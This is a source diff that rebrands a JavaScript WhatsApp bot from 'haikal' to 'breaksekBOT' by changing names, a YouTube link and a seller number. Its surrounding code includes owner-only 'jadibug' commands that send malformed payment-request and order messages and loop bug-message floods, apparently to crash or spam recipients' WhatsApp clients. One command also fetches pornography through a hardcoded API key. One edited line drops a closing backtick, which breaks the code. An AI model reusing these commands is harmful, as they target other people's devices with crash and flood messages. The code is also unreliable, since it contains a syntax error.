@@ -124,7 +124,7 @@ const deploy = (teks) => {
   haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
 //=================================================//
 const reply = (teks) => {
-return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `breaksekBOT`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: m })} 
+return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `breaksekBOT`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/UCXb9jWAemn6RZ2gmImFG0uQ`}}}, { quoted: m })} 
 //=================================================//
 try {
 let isNumber = x => typeof x === 'number' && !isNaN(x)
@@ -288,7 +288,7 @@ Waktu ${clockString(new Date - afkTime)}
 if (db.data.users[m.sender].afkTime > -1) {
 let user = global.db.data.users[m.sender]
 m.reply(`
-Hello Saya Bot Hw Mods${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
+Hello Saya breaksekBOT${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
 Selama ${clockString(new Date - user.afkTime)}
 `.trim())
 user.afkTime = -1
@@ -316,7 +316,7 @@ var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "surface": "CATALOG",
 "message": `${teks}`,
 "orderTitle": `${teks}`,
-"sellerJid": "6283186308195@s.whatsapp.net",
+"sellerJid": "6281331184338@s.whatsapp.net",
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 }
 }), { userJid: m.chat, quoted: doc })
@@ -553,7 +553,7 @@ break
 case 'jadibugpayment' : {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} breaksek`)
 let teks = `${q}`
 {
 haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC © °rexju°͢`,"body": `Selamat ${salam} kak ${pushname}`,
@@ -569,7 +569,7 @@ break
 case 'jadibugbokep': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} breaksek`)
 let teks = `${q}`
 {
 dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
@@ -580,7 +580,7 @@ break
 case 'jadibugsw': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} breaksek`)
 let teks = `${q}`
 {
 joau = fs.readFileSync('./baseikal/video/haikal.mp4')
@@ -591,7 +591,7 @@ break
 case 'jadibugbutton':
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
-if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal`)
+if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} breaksek
 let teks = `${q}`
 {
 const buttonssk = [
@@ -616,7 +616,7 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku haikal`
+ydd = `Hallo Aku breaksek`
 for (let i = 0; i < jumlah; i++) {
 let teks = `══✪〘 *BANG INI BUG ? ☺️* 〙✪══
  ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
